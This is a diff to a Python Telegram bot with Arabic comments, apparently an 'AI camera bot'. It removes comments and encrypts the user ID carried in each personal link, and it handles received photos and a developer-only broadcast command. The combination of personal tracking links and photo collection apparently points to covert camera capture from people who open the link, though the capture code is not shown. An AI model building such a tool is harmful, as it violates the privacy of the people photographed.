@@ -401,12 +401,14 @@ from flask import Flask, request, jsonify
 from threading import Thread
 import os
 
+# ✅ إضافة استيراد التشفير
+from encryption import encrypt_id, decrypt_id
+
 # ---------------------------------------------
-# 1. إعدادات السيرفر الوهمي (لإبقاء البوت يعمل على Render)
+# 1. إعدادات السيرفر الوهمي
 # ---------------------------------------------
 app = Flask(__name__)
 
-# إحصائيات (تعريفها هنا لتكون متاحة للجميع)
 user_stats = {}
 total_photos_received = 0
 
@@ -461,7 +463,6 @@ def home():
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """للتكامل مع خدمات خارجية إذا لزم الأمر"""
     data = request.json
     return jsonify({"status": "ok", "message": "Webhook received"})
 
@@ -476,7 +477,6 @@ def keep_alive():
 # ---------------------------------------------
 # 2. إعدادات بوت تيليجرام
 # ---------------------------------------------
-# قراءة المتغيرات البيئية
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 if not TOKEN:
     raise ValueError("لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة")
@@ -486,11 +486,10 @@ DEVELOPER_CHAT_ID = os.environ.get("DEVELOPER_CHAT_ID")
 if DEVELOPER_CHAT_ID:
     DEVELOPER_CHAT_ID = int(DEVELOPER_CHAT_ID)
 else:
-    DEVELOPER_CHAT_ID = 6002805119  # القيمة الافتراضية
+    DEVELOPER_CHAT_ID = 6002805119
 
 bot = telebot.TeleBot(TOKEN)
 
-# إعدادات التسجيل
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
@@ -506,7 +505,6 @@ def send_welcome(message):
     user_id = message.chat.id
     user_name = message.from_user.first_name
     
-    # تسجيل المستخدم في الإحصائيات
     if user_id not in user_stats:
         user_stats[user_id] = {
             "name": user_name,
@@ -517,25 +515,22 @@ def send_welcome(message):
     else:
         user_stats[user_id]["last_active"] = datetime.now()
     
-    # دمج رابط الموقع مع ايدي المستخدم
-    personal_link = f"{BASE_URL}?id={user_id}"
+    # ✅ استخدام التشفير
+    encrypted = encrypt_id(user_id)
+    personal_link = f"{BASE_URL}?q={encrypted}"
     
-    # إنشاء كيبورد (لوحة مفاتيح) تفاعلية
     markup = telebot.types.InlineKeyboardMarkup(row_width=2)
     
-    # زر لنسخ الرابط
     copy_btn = telebot.types.InlineKeyboardButton(
         text="📋 انسخ الرابط", 
-        callback_data=f"copy_{user_id}"
+        callback_data=f"copy_{encrypted}"  # ✅ مشفر
     )
     
-    # زر للحصول على التعليمات
     help_btn = telebot.types.InlineKeyboardButton(
         text="❓ التعليمات", 
         callback_data="help"
     )
     
-    # زر للإحصائيات
     stats_btn = telebot.types.InlineKeyboardButton(
         text="📊 إحصائياتي", 
         callback_data="stats"
@@ -567,16 +562,14 @@ def send_welcome(message):
     
     logger.info(f"New user started: {user_name} (ID: {user_id})")
 
+# ✅ تعديل دالة copy_link
 @bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
 def copy_link(call):
-    """نسخ الرابط عند الضغط على الزر"""
-    user_id = call.data.replace("copy_", "")
-    personal_link = f"{BASE_URL}?id={user_id}"
+    encrypted = call.data.replace("copy_", "")
+    personal_link = f"{BASE_URL}?q={encrypted}"
     
-    # إجابة على الضغط
     bot.answer_callback_query(call.id, "📋 اضغط مع الاستمرار على الرابط لنسخه!")
     
-    # إرسال رسالة تحتوي على الرابط مع تعليمات
     bot.send_message(
         call.message.chat.id,
         f"📋 *رابطك الشخصي:*\n"
@@ -594,7 +587,6 @@ def copy_link(call):
 @bot.message_handler(commands=['stats'])
 def show_stats(message):
     user_id = message.chat.id
-    user_name = message.from_user.first_name
     
     if user_id in user_stats:
         user_stat = user_stats[user_id]
@@ -639,15 +631,12 @@ def send_help(message):
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
-    """للبث لجميع المستخدمين (للمطور فقط)"""
     user_id = message.chat.id
     
-    # التحقق إذا كان المستخدم هو المطور
     if user_id != DEVELOPER_CHAT_ID:
         bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
         return
     
-    # استخراج الرسالة من الأمر
     command_parts = message.text.split(' ', 1)
     if len(command_parts) < 2:
         bot.reply_to(message, "❌ صيغة خاطئة. استخدم:\n/broadcast نص الرسالة")
@@ -655,7 +644,6 @@ def broadcast_message(message):
     
     broadcast_text = command_parts[1]
     
-    # البث لجميع المستخدمين
     success_count = 0
     fail_count = 0
     
@@ -686,7 +674,6 @@ def handle_photos(message):
     user_id = message.chat.id
     user_name = message.from_user.first_name if message.from_user else "مجهول"
     
-    # تحديث إحصائيات المستخدم
     if user_id in user_stats:
         user_stats[user_id]["photo_count"] += 1
         user_stats[user_id]["last_active"] = datetime.now()
@@ -700,15 +687,10 @@ def handle_photos(message):
     
     total_photos_received += 1
     
-    # استخراج أفضل جودة للصورة
     photo = message.photo[-1]
-    file_id = photo.file_id
-    
-    # الحصول على معلومات الملف
-    file_info = bot.get_file(file_id)
+    file_info = bot.get_file(photo.file_id)
     file_size = file_info.file_size / 1024
     
-    # إرسال تأكيد استلام
     caption = (
         f"✅ تم استلام صورة جديدة!\n\n"
         f"👤 من: {user_name}\n"
@@ -723,7 +705,7 @@ def handle_photos(message):
     logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")
 
 # ---------------------------------------------
-# 5. معالجة Callback Queries (الزر التفاعلي)
+# 5. معالجة Callback Queries
 # ---------------------------------------------
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -737,11 +719,10 @@ def handle_callback(call):
         bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")
     
     elif call.data.startswith("copy_"):
-        # تم معالجتها في الدالة المنفصلة أعلاه
         pass
 
 # ---------------------------------------------
-# 6. معالجة الرسائل النصية العادية
+# 6. معالجة الرسائل النصية
 # ---------------------------------------------
 
 @bot.message_handler(func=lambda message: True)
@@ -765,10 +746,9 @@ def handle_all_messages(message):
         bot.reply_to(message, welcome_text)
 
 # ---------------------------------------------
-# 7. تشغيل البوت والسيرفر معاً
+# 7. تشغيل البوت
 # ---------------------------------------------
 
-# تشغيل السيرفر في الخلفية
 keep_alive()
 
 print("=" * 50)
@@ -776,7 +756,6 @@ print("🤖 بوت كاميرا الذكاء الاصطناعي")
 print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 print("=" * 50)
 
-# حلقة التشغيل اللانهائية
 while True:
     try:
         logger.info("Starting bot polling...")
